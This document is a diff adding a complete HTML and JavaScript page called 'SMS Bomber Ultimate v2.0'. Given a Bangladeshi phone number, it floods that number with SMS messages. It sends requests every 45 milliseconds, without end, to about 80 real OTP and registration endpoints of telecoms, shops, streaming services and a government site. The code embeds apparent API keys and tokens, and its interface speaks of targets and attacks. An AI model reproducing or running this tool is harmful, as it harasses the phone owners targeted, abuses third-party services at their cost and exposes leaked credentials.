@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber Ultimate v2.0 - by Mehrab Adnan Tanvir</title>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600&amp;family=Sora:wght@400;500;600&amp;family=Orbitron:wght@400;700&amp;family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #7C3AED;
+            --secondary: #4F46E5;
+            --accent: #00F5FF;
+            --highlight: #A855F7;
+            --success: #22C55E;
+            --danger: #EF4444;
+            --glass: rgba(15, 23, 42, 0.65);
+            --glass-border: rgba(148, 163, 184, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #05040f;
+            color: #e0e0ff;
+            font-family: 'Inter', system-ui, sans-serif;
+            min-height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        /* === BACKGROUND LAYERS === */
+        .bg-layer {
+            position: absolute;
+            inset: 0;
+            z-index: -3;
+        }
+
+        .aurora {
+            background: linear-gradient(180deg, 
+                rgba(124, 58, 237, 0.15) 0%,
+                rgba(79, 70, 229, 0.12) 40%,
+                rgba(0, 245, 255, 0.08) 70%,
+                transparent 100%);
+            animation: auroraFlow 25s ease infinite;
+        }
+
+        @keyframes auroraFlow {
+            0% { transform: translateY(-20%); }
+            50% { transform: translateY(10%); }
+            100% { transform: translateY(-20%); }
+        }
+
+        .grid-bg {
+            position: absolute;
+            inset: 0;
+            background-image: 
+                linear-gradient(rgba(124, 58, 237, 0.08) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(124, 58, 237, 0.08) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 40s linear infinite;
+            opacity: 0.6;
+            z-index: -2;
+        }
+
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .particles {
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 245, 255, 0.3) 0%, transparent 40%),
+                        radial-gradient(circle at 70% 60%, rgba(168, 85, 247, 0.25) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 80%, rgba(124, 58, 237, 0.25) 0%, transparent 45%);
+            animation: particleDrift 30s linear infinite;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes particleDrift {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 100% 100%; }
+        }
+
+        .noise {
+            position: absolute;
+            inset: 0;
+            background-image: url('https://picsum.photos/id/1015/1920/1080');
+            background-size: cover;
+            mix-blend-mode: overlay;
+            opacity: 0.03;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .container {
+            width: 95%;
+            max-width: 480px;
+            background: var(--glass);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--glass-border);
+            border-radius: 32px;
+            padding: 40px 32px;
+            box-shadow: 
+                0 0 60px -10px rgba(124, 58, 237, 0.4),
+                0 25px 50px -12px rgb(0 0 0 / 0.5);
+            position: relative;
+            z-index: 10;
+            animation: floatContainer 6s ease-in-out infinite;
+        }
+
+        @keyframes floatContainer {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+        }
+
+        /* Gradient Border */
+        .container::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            background: linear-gradient(90deg, var(--primary), var(--accent), var(--highlight), var(--primary));
+            border-radius: 34px;
+            z-index: -1;
+            filter: blur(8px);
+            opacity: 0.6;
+            animation: borderRotate 8s linear infinite;
+        }
+
+        @keyframes borderRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #c4b5fd, #e0e7ff, #a5b4fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 30px rgba(124, 58, 237, 0.5);
+        }
+
+        .dev-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--accent);
+            background: rgba(0, 245, 255, 0.1);
+            padding: 6px 18px;
+            border-radius: 9999px;
+            border: 1px solid rgba(0, 245, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        /* INPUT */
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 28px;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--accent);
+            z-index: 2;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 20px 20px 20px 56px;
+            background: rgba(15, 23, 42, 0.7);
+            border: 2px solid rgba(148, 163, 184, 0.2);
+            border-radius: 20px;
+            color: white;
+            font-size: 20px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 3px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(0, 245, 255, 0.2);
+            outline: none;
+        }
+
+        .input-label {
+            position: absolute;
+            left: 56px;
+            top: 12px;
+            font-size: 12px;
+            color: #64748b;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        /* BUTTONS */
+        .btn-group {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        button {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-start {
+            background: linear-gradient(135deg, var(--primary), #6d28d9);
+            color: white;
+            box-shadow: 0 10px 30px -10px var(--primary);
+        }
+
+        .btn-start:hover {
+            transform: translateY(-4px) scale(1.03);
+            box-shadow: 0 20px 40px -10px var(--primary);
+        }
+
+        .btn-stop {
+            background: linear-gradient(135deg, #e11d48, #9f1239);
+            color: white;
+            box-shadow: 0 10px 30px -10px #e11d48;
+            display: none;
+        }
+
+        .btn-stop:hover {
+            transform: translateY(-4px) scale(1.03);
+            box-shadow: 0 20px 40px -10px #e11d48;
+        }
+
+        button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 40%;
+            height: 200%;
+            background: linear-gradient(
+                120deg,
+                transparent,
+                rgba(255,255,255,0.4),
+                transparent
+            );
+            transform: skewX(-25deg);
+            animation: shine 4s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-150%) skewX(-25deg); }
+            20% { transform: translateX(300%) skewX(-25deg); }
+            100% { transform: translateX(300%) skewX(-25deg); }
+        }
+
+        /* STATS */
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .stat-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(148, 163, 184, 0.15);
+            border-radius: 20px;
+            padding: 18px 20px;
+            backdrop-filter: blur(12px);
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--accent);
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--accent);
+            margin-top: 6px;
+            transition: all 0.4s ease;
+        }
+
+        /* LOG CONTAINER */
+        .log-container {
+            height: 260px;
+            background: rgba(2, 6, 23, 0.85);
+            border: 1px solid rgba(148, 163, 184, 0.15);
+            border-radius: 20px;
+            overflow-y: auto;
+            padding: 20px;
+            font-family: 'Sora', monospace;
+            font-size: 13.5px;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .log-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: linear-gradient(to bottom, rgba(2,6,23,0.95), transparent);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .log-entry {
+            padding: 8px 12px;
+            margin-bottom: 8px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            animation: logFadeIn 0.4s ease forwards;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+
+        @keyframes logFadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .log-entry:hover {
+            background: rgba(124, 58, 237, 0.15);
+        }
+
+        .api-name {
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        .status-ok { color: var(--success); }
+        .status-fast { color: var(--accent); font-weight: 600; }
+
+        /* TELEGRAM BUTTON */
+        .telegram-btn {
+            display: block;
+            width: 100%;
+            margin-top: 28px;
+            padding: 16px;
+            background: linear-gradient(90deg, rgba(0, 136, 255, 0.15), rgba(59, 130, 246, 0.1));
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            color: #bae6fd;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .telegram-btn:hover {
+            background: linear-gradient(90deg, rgba(0, 136, 255, 0.3), rgba(59, 130, 246, 0.25));
+            transform: translateY(-2px);
+        }
+
+        /* SCROLLBAR */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(15, 23, 42, 0.6);
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--primary), var(--accent));
+            border-radius: 10px;
+        }
+
+        /* Status Pulse */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Layers -->
+    <div class="bg-layer aurora"></div>
+    <div class="grid-bg"></div>
+    <div class="particles"></div>
+    <div class="bg-layer noise"></div>
+
+    <div class="container">
+        <div class="header">
+            <h1>SMS BOOMER Ultimate</h1>
+            <div class="dev-tag">
+                <i class="fa-solid fa-bolt"></i>
+                v2.0 • Mehrab Adnan Tanvir
+            </div>
+        </div>
+
+        <div class="input-wrapper">
+            <i class="fa-solid fa-mobile-screen-button"></i>
+            <input type="text" id="phoneNumber" placeholder="01XXXXXXXXX" maxlength="11">
+        </div>
+
+        <div class="btn-group">
+            <button class="btn-start" id="startBtn" onclick="startAttack()">
+                <i class="fa-solid fa-play"></i>
+                INITIATE FLOOD
+            </button>
+            <button class="btn-stop" id="stopBtn" onclick="stopAttack()">
+                <i class="fa-solid fa-stop"></i>
+                TERMINATE
+            </button>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-label">
+                    <i class="fa-solid fa-circle-dot"></i>
+                    STATUS
+                </div>
+                <div class="stat-value" id="statusText">IDLE</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">
+                    <i class="fa-solid fa-arrow-trend-up"></i>
+                    ATTACK COUNT
+                </div>
+                <div class="stat-value" id="countDisplay">0</div>
+            </div>
+        </div>
+
+        <div class="log-container" id="logBox">
+            <div class="log-entry">
+                <span class="api-name"><i class="fa-solid fa-shield-halved"></i> SYSTEM</span>
+                <span class="status-ok">READY • AWAITING TARGET</span>
+            </div>
+        </div>
+
+        <a href="https://mehrabadnantanvir.netlify.app/" target="_blank" class="telegram-btn">
+            <i class="fa-solid fa-globe"></i>
+            VISIT DEVELOPER PORTFOLIO
+        </a>
+    </div>
+
+    <script>
+        let isRunning = false;
+        let count = 0;
+        let intervalId;
+       
+        // 200+ API List (Combined & Optimized)
+        const apis = [
+            // Render / Spam Services
+            "https://lmnx9-sms-spam-v11.onrender.com/api{num}?number={phone}",
+            "https://lmnx9-sms-spam-v11.onrender.com/api{num}?number={phone}",
+           
+            // Bangladesh Top Tier
+            {url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", method: "GET"},
+            {url: "https://app.deshal.net/api/auth/login", method: "POST", body: '{"phone":"{phone}"}'},
+            {url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0", method: "GET"},
+            {url: "https://webloginda.grameenphone.com/backend/api/v1/otp", method: "POST", body: '{"msisdn":"{phone}"}'},
+            {url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", method: "POST", body: '{"phone":"{phone}","email":"","language":"en"}'},
+            {url: "https://api.busbd.com.bd/api/auth", method: "POST", body: '{"phone":"+88{phone}"}'},
+            {url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", body: '{"full_name":"User","email":"test@test.com","company_name":"Corp","phone_number":"{phone}"}'},
+            {url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}'},
+            {url: "https://api.apex4u.com/api/auth/login", method: "POST", body: '{"phoneNumber":"{phone}"}'},
+            {url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", body: '{"phone":"{phone}","intent":"login"}'},
+            {url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=", method: "POST", body: '{"msisdn":"{phone}"}'},
+            {url: "https://user-api.jslglobal.co/v2/send-otp", method: "POST", body: '{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}'},
+            {url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", body: '{"mobile":"+88{phone}"}'},
+            {url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", method: "POST", body: '{"mobile":"+88{phone}"}'},
+            {url: "https://auth.qcoom.com/api/v1/otp/send", method: "POST", body: '{"mobileNumber":"+88{phone}"}'},
+            {url: "https://api.garibookadmin.com/api/v3/user/login", method: "POST", body: '{"mobile":"{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}'},
+            {url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", body: '{"mobile":"{phone}"}'},
+            {url: "https://api.shikho.com/public/activity/otp", method: "POST", body: '{"phone":"{phone}","intent":"ap-discount-request"}'},
+            {url: "https://core.easy.com.bd/api/v1/registration", method: "POST", body: '{"name":"User","email":"u@u.com","mobile":"{phone}","password":"123456","password_confirmation":"123456"}'},
+            {url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn", method: "GET"},
+            {url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", body: '{"msisdn":"{phone}"}'},
+            {url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-d8cdb268", method: "POST", body: '{"phoneNumber":"+88{phone}","requestType":"send","whatsappConsent":true}'},
+            {url: "https://app.addatimes.com/api/login", method: "POST", body: '{"phone":"{phone}","country_code":"BD"}'},
+            {url: "https://regalfurniturebd.com/api/auth/otp-generate", method: "POST", body: '{"phone":"{phone}","verification_code":""}'},
+            {url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"email":"u@u.com","phone_number":"88{phone}"}'},
+            {url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", method: "POST", body: '{"name":"User","email":"u@u.com","phone":"{phone}","password":"Pass@123"}'},
+            {url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", method: "POST", body: '{"device_uuid":"uuid","firebase_token":"ft","geo_location":"loc","mno":"Grameenphone","wallet_number":"{phone}"}'},
+            {url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"number":"+88{phone}"}'},
+            {url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"number":"+880{phone}"}'},
+            {url: "https://www.pkluck2.com/wps/verification/sms/noLogin", method: "POST", body: '{"mobileNum":"{phone}","countryDialingCode":"880"}'},
+            {url: "https://applink.com.bd/appstore-v4-server/login/otp/request", method: "POST", body: '{"msisdn":"880{phone}"}'},
+            {url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", method: "POST", body: '{"Name":"User","Phone":"+880{phone}"}'},
+            {url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", body: '{"mobile_no":"{phone}"}'},
+            {url: "https://www.jayabajibd.life/api/register/confirm", method: "POST", body: '{"mobileno":"{phone}","username":"user864","firstname":"","new_password":"Pass@123","confirm_new_password":"Pass@123","country_code":"880"}'},
+            {url: "https://api.swap.com.bd/api/v1/send-otp/v2", method: "POST", body: '{"phone":"{phone}"}'},
+            {url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", method: "POST", body: '{"phone":"+880{phone}"}'},
+            {url: "https://api.medeasy.health/api/send-otp/+880{phone}/", method: "GET"},
+            {url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B880{phone}&platform=app&activity=login", method: "POST"},
+            {url: "http://ultranetrn.com.br/fonts/api.php?number={phone}", method: "GET"},
+            {url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", method: "GET"},
+            {url: "http://nesco.sslwireless.com/api/v1/login", method: "POST", body: '{"phone_number":"{phone}"}'},
+            {url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", method: "POST", body: '{"country_code":"+880","phone":"{phone}"}'},
+            {url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", method: "POST", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}'},
+            {url: "https://ss.binge.buzz/otp/send/login{phone}", method: "GET"},
+        ];
+
+        const baseApis = [
+            {url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", body: '{"mobile":"+88{phone}"}'},
+            {url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", method: "POST", body: '{"mobile":"+88{phone}"}'},
+            {url: "https://auth.qcoom.com/api/v1/otp/send", method: "POST", body: '{"mobileNumber":"+88{phone}"}'},
+            {url: "https://api.garibookadmin.com/api/v3/user/login", method: "POST", body: '{"mobile":"{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}'},
+            {url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", body: '{"mobile":"{phone}"}'},
+            {url: "https://api.shikho.com/public/activity/otp", method: "POST", body: '{"phone":"{phone}","intent":"ap-discount-request"}'},
+            {url: "https://core.easy.com.bd/api/v1/registration", method: "POST", body: '{"name":"User","email":"u@u.com","mobile":"{phone}","password":"123456","password_confirmation":"123456"}'},
+            {url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn", method: "GET"},
+            {url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", body: '{"msisdn":"{phone}"}'},
+            {url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-d8cdb268", method: "POST", body: '{"phoneNumber":"+88{phone}","requestType":"send","whatsappConsent":true}'},
+            {url: "https://app.addatimes.com/api/login", method: "POST", body: '{"phone":"{phone}","country_code":"BD"}'},
+            {url: "https://regalfurniturebd.com/api/auth/otp-generate", method: "POST", body: '{"phone":"{phone}","verification_code":""}'},
+            {url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"email":"u@u.com","phone_number":"88{phone}"}'},
+            {url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", method: "POST", body: '{"name":"User","email":"u@u.com","phone":"{phone}","password":"Pass@123"}'},
+            {url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", method: "POST", body: '{"device_uuid":"uuid","firebase_token":"ft","geo_location":"loc","mno":"Grameenphone","wallet_number":"{phone}"}'},
+            {url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"number":"+88{phone}"}'},
+            {url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", body: '{"number":"+880{phone}"}'},
+            {url: "https://www.pkluck2.com/wps/verification/sms/noLogin", method: "POST", body: '{"mobileNum":"{phone}","countryDialingCode":"880"}'},
+            {url: "https://applink.com.bd/appstore-v4-server/login/otp/request", method: "POST", body: '{"msisdn":"880{phone}"}'},
+            {url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", method: "POST", body: '{"Name":"User","Phone":"+880{phone}"}'},
+            {url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", body: '{"mobile_no":"{phone}"}'},
+            {url: "https://www.jayabajibd.life/api/register/confirm", method: "POST", body: '{"mobileno":"{phone}","username":"user864","firstname":"","new_password":"Pass@123","confirm_new_password":"Pass@123","country_code":"880"}'},
+            {url: "https://api.swap.com.bd/api/v1/send-otp/v2", method: "POST", body: '{"phone":"{phone}"}'},
+            {url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", method: "POST", body: '{"phone":"+880{phone}"}'},
+            {url: "https://api.medeasy.health/api/send-otp/+880{phone}/", method: "GET"},
+            {url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B880{phone}&platform=app&activity=login", method: "POST"},
+            {url: "http://ultranetrn.com.br/fonts/api.php?number={phone}", method: "GET"},
+            {url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", method: "GET"},
+            {url: "http://nesco.sslwireless.com/api/v1/login", method: "POST", body: '{"phone_number":"{phone}"}'},
+            {url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", method: "POST", body: '{"country_code":"+880","phone":"{phone}"}'},
+            {url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", method: "POST", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}'},
+            {url: "https://ss.binge.buzz/otp/send/login{phone}", method: "GET"},
+        ];
+
+        let fullApiList = [...apis, ...baseApis, ...baseApis, ...baseApis];
+
+        function log(msg, type = 'normal') {
+            const box = document.getElementById('logBox');
+            const div = document.createElement('div');
+            div.className = `log-entry`;
+           
+            let colorClass = '';
+            if(type === 'ok') colorClass = 'status-ok';
+            if(type === 'fast') colorClass = 'status-fast';
+            
+            div.innerHTML = `<span class="api-name">${msg.name}</span> <span class="${colorClass}">${msg.status}</span>`;
+            box.prepend(div);
+           
+            if(box.children.length > 40) {
+                box.removeChild(box.lastChild);
+            }
+        }
+
+        async function send(api, phone) {
+            let url = typeof api === 'string' ? api.replace(/{phone}/g, phone) : api.url.replace(/{phone}/g, phone);
+           
+            const options = {
+                method: api.method || 'GET',
+                headers: { 'Content-Type': 'application/json' },
+                mode: 'cors'
+            };
+            if (api.body) {
+                options.body = api.body.replace(/{phone}/g, phone);
+            }
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 2000);
+               
+                await fetch(url, { ...options, signal: controller.signal });
+                clearTimeout(timeoutId);
+               
+                count++;
+                document.getElementById('countDisplay').innerText = count;
+                return true;
+            } catch (error) {
+                count++;
+                document.getElementById('countDisplay').innerText = count;
+                return false;
+            }
+        }
+
+        async function startAttack() {
+            const phone = document.getElementById('phoneNumber').value;
+            if (!phone) {
+                alert("Enter a number first!");
+                return;
+            }
+            isRunning = true;
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            const statusEl = document.getElementById('statusText');
+            statusEl.innerText = "FLOODING...";
+            statusEl.style.color = "#00F5FF";
+            statusEl.classList.add('pulse');
+            
+            log({name: "SYSTEM", status: `TARGET LOCKED → ${phone}`}, 'fast');
+
+            while (isRunning) {
+                const randomApi = fullApiList[Math.floor(Math.random() * fullApiList.length)];
+               
+                send(randomApi, phone).then(success => {
+                    if(isRunning && Math.random() > 0.65) {
+                        const domain = typeof randomApi === 'string' ? randomApi.split('/')[2] : randomApi.url.split('/')[2];
+                        log({name: domain || "API", status: success ? 'SMS SENT ✓' : 'REQUESTED'}, 'ok');
+                    }
+                });
+                
+                await new Promise(r => setTimeout(r, 45));
+            }
+        }
+
+        function stopAttack() {
+            isRunning = false;
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            const statusEl = document.getElementById('statusText');
+            statusEl.innerText = "TERMINATED";
+            statusEl.style.color = "#EF4444";
+            statusEl.classList.remove('pulse');
+            log({name: "SYSTEM", status: "ATTACK HALTED"}, 'fast');
+        }
+    </script>
+</body>
+</html>
